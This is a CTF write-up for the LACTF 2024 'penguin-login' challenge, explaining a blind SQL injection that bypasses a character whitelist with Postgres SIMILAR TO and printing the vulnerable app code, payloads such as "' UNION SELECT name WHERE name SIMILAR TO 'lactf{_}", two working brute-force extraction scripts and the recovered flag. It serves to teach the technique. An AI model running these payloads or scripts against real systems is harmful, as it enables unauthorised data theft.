---
layout: post
title: LACTF 2024 - penguin-login
categories: ctf_lactf2024
keywords: "web"
comments: true
authors:
    - Tiziano-Caruana
---

# penguin-login
*February 2024 - Blind SQL injection*

> "I got tired of people leaking my password from the db so I moved it out of the db."

*Prior knowledge: basic web-related knowledge, SQL*

## Context
We are provided with the link to the challenge website and the corresponding source code. The website is quite simple, and the usage of its features is straightforward:

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/img/website.png" alt="website home page">

All the code is in `app.py`:

```py
...
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]


@cache
def get_database_connection():
    # Get database credentials from environment variables
    db_user = os.environ.get("POSTGRES_USER")
    db_password = os.environ.get("POSTGRES_PASSWORD")
    db_host = "db"

    # Establish a connection to the PostgreSQL database
    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)

    return connection


with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()


@app.post("/submit")
def submit_form():
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        conn.commit()
...
```

We know that the website uses Postgres as the [RDBMS](https://cloud.google.com/learn/what-is-a-relational-database?hl=en)/[SQL database](https://www.solarwinds.com/resources/it-glossary/sql-database), and that the flag is contained in the penguins table along with the penguins. 

The code is straightforward: the first half deals only with connections and setup, while the `submit` endpoint checks that the characters entered by the user are part of the whitelist (letters, numbers, `{}`, and `_`), which effectively consists of the characters that can be part of the flag.

## The ideal thought process
A quick analysis of the code can already tell us everything we need to know, but why not play around with the only input available on the site?

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/vid/code200.gif" alt="code 200 example">

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/vid/code201.gif" alt="code 201 example">

We can thus see the differences in response depending on the input. If a penguin is found, a [status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) is returned, while if nothing is found, we get a 201. 

As we can see in line 63, the query is constructed using string interpolation with [%-formatting](https://www.programiz.com/python-programming/string-interpolation#:~:text=Example%203) which allows for user input. This approach is vulnerable to [SQL injection](https://stackoverflow.com/questions/51960654/python-string-formatting-percentage-symbol-after-string-substituion), and the challenge author has simulated a makeshift solution through a system of [whitelisting e blacklisting](https://www.ninjaone.com/it-hub/endpoint-security/what-is-input-sanitization/#:~:text=Input%20sanitization%20methods).

### Exploiting the vulnerability

There's no way to use comments! How will we do it??? 😭😭😭
In this case, it's not a tragedy, since we only need to get rid of one apostrophe. We just need to close the payloads with a string. This means that instead of using the classic logic SQLi test `' OR 1=1`, we'll use its alternative `' OR 'a'='a'`, without the final apostrophe since we'll use the last 'a' to "burn" the extra apostrophe present in the code.

Nice thinking, the problem is that the equal sign is not whitelisted. We can't even use `LIKE` instead of the equal sign, since it's blacklisted.

In SQL, we can indicate boolean values with 0 and 1, and this applies even if they are strings. So, just like `' OR 1` returns `TRUE`, so does `' OR '1`.

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/vid/injTest.gif" alt="First injection test">

It works! Now we just have to adjust the injection in order to exfiltrate the flag.

But there's no way to use `LIKE` (I'm not completely sure about this one, but I did not use it). Searching on the internet for *LIKE alternative in postgreSQL*, among the top results, I found sections [6.6](https://www.postgresql.org/docs/7.3/functions-matching.html#:~:text=6.6.%20Pattern%20Matching) and [9.7](https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-MATCHING) of the documentation, both concerning pattern matching. In these parts of the documentation, an alternative to the `LIKE` statement is indicated, namely `SIMILAR TO`, which differs from the former only in the interpretation of RegEx. For our purposes, there is no difference.

At this point, we have practically won, and all that's left is to build the payload and the corresponding script. Probably SQLmap already had some shit available for the occasion, but I don't really care.

#### Tips for beginners
At this point, for a player with a decent level of experience, the challenge is already solved. However, if it's one of the first times solving a SQLi UNION-based challenge, it's possible to take a few extra intermediate steps to make it clearer what is being executed by the DBMS and how the payload should be constructed.

##### Copying the vulnerable line, and playing with it
In the line `"SELECT * FROM penguins WHERE name = '%s'" % username`, our input is directly inserted in place of `%s`. To ensure that you are writing a sensible payload, you can first try writing it in place of the placeholder:

```sql
SELECT * FROM penguins WHERE name = '' OR '1'
```

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/vid/PlayTest.gif" alt='Example of the just presented "technique"'>

Make sure not to use the mouse or arrow keys (in other words, don't move the cursor) while you're testing your inputs ;)

##### Understanding if the payload makes sense
Instead of blindly using a command/trick/workaround/technique that you see for the first time, make sure first that it works as you imagine in a more "relaxed" context, where you can write and access outputs and error logs without limitations. Discovering that the query returned `false` because you were not running the command correctly, or that it errored because the command was related to another DBMS, is particularly frustrating.

There are services (like [OneCompiler](https://onecompiler.com/postgresql/), that allow you to execute code directly online. Always make sure 100% when using these services that you have selected the right DBMS.

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/img/OnlineExample.png" alt="Example of using OneCompiler to verify the result of an unconventional query">

##### Proceed in phases
It's helpful to reason in phases the first few times. In mathematics, we can start skipping steps during calculations, but only because we've become familiar enough:

- Identify your goal: in this case, "I want to get the flag" -> "I want to get all the characters of the record that starts with the flag format and ends with `}`".
- Write it down as you would normally: `SELECT name WHERE name LIKE 'lactf{%}'`.
- Rewrite it bypassing whitelist and blacklist: `SELECT name WHERE name SIMILAR TO 'lactf{_}'` with as many `_` as there are characters in the flag.
- Combine the two techniques shown previously: `SELECT name WHERE name SIMILAR TO 'lactf{_}'` + `SELECT * FROM penguins WHERE name = '%s'` -> remembering that the only column in the DB is `name`, and that we can only write commands in place of `%s`: `SELECT * FROM penguins WHERE name = '' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}'`

The payload will simply be what we wrote in this last phase, which is `' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}`

### Constructing the payload
At this point, all we have to do is construct a `UNION` with a `SIMILAR TO` instead of the more popular `LIKE`. In my case: `' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}`. 

I'm not sure if there was a more convenient way to get the length of the flag, but I just added underscores until I got a positive result. These are the payloads useful for extracting the flag, modified from those used during the competition:

`findlen.py`
```py
from requests import *

URL = "https://penguin.chall.lac.tf/"
s = Session()
payloadStart = "' OR name SIMILAR TO 'lactf{"
payloadEnd = ""
i = 0

while True:
    payload = payloadStart + payloadEnd + "}"
    r = s.post(URL + "submit", data={"username": payload})
    if r.status_code == 200:
        print("worked: ", payload)
        break
    else:
        payloadEnd += "_"
        print("failed: ", payload)
```

`findflag.py`
```py
from requests import *
from string import digits, ascii_uppercase, ascii_lowercase

URL = "https://penguin.chall.lac.tf/"
s = Session()
payloadStart = "' OR name SIMILAR TO 'lactf{"
payloadEnd = "______________________________________"
i = 0

while True:
    if len(payloadEnd) > 0:
        payloadEnd = payloadEnd[:-1]
    else:
        break
    for c in digits + ascii_lowercase + ascii_uppercase:
        payload = payloadStart + c + payloadEnd + "}"
        r = s.post(URL + "submit", data={"username": payload})
        if r.status_code == 200:
            print("worked: ", payload)
            payloadStart += c
            break
        else:
            print("failed: ", payload)
    else:
        payloadStart += "_"
        print("skipping: ", payload)
```

Due to infrastructure issues, the first character of the flag couldn't be retrieved. I had to guess it (in quite a few attempts xd)

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/vid/FinalPayload.gif" alt="Execution of the final script">

`lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}`

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/img/InterestingTicket.png" alt="Extract from an interesting conversation had in a ticket">

### How it actually went during the CTF

One evening, I was at the gym to vent the frustration of not being able to find a rock on the west coast of California, United States (I love OSINT). Just before leaving, I heard that my teammate Leandro "Loldemort" Pagano was having a bad time with an SQLi. "Let me solve it," I wrote to him.

I hadn't read the code yet when I received a message on Discord from said player, expressing interest in solving the challenge. "Just use `_`", I said jokingly. I didn't know that the character was actually whitelisted.

My teammate had already discovered the existence of `SIMILAR TO`, so once I got home, I only had to deal with writing the payload. 

#### Payload used during the CTF

`findlen.py`
```py
from requests import *
from bs4 import BeautifulSoup

URL = "https://penguin.chall.lac.tf/"
s = Session()
payloadStart = "' OR name SIMILAR TO 'lactf{"
payloadEnd = ""
i = 0

while True:
    payload = payloadStart + payloadEnd + "}"
    r = s.post(URL + "submit", data={"username": payload})
    soup = BeautifulSoup(r.text, "html.parser")
    if "We found a penguin" in soup.get_text():
        print("worked: ", payload)
        break
    else:
        payloadEnd += "_"
        print("failed: ", payload)
```

`findflag.py`
```py
from requests import *
from bs4 import BeautifulSoup
from string import digits, ascii_uppercase, ascii_lowercase

URL = "https://penguin.chall.lac.tf/"
s = Session()
payloadStart = "' OR name SIMILAR TO 'lactf{"
payloadEnd = "______________________________________"
i = 0

while True:
    payloadEnd = payloadEnd[:-1]
    for c in digits + ascii_lowercase + ascii_uppercase + "!-@":
        payload = payloadStart + c + payloadEnd + "}"
        r = s.post(URL + "submit", data={"username": payload})
        soup = BeautifulSoup(r.text, "html.parser")
        if "We found a penguin" in soup.get_text():
            print("worked: ", payload)
            payloadStart += c
            break
        else:
            print("failed: ", payload)
    else:
        print("end: ", payload)
        break
```

I was too lazy to press F12 while playing around, so I just based my final payload on the `"We found a penguin!!!!!"` response.

<img class="img-responsive" src="{{ site-url }}/assets/lactf2024/penguin-login/img/ItalianRant.png" alt="Ranting in Italian">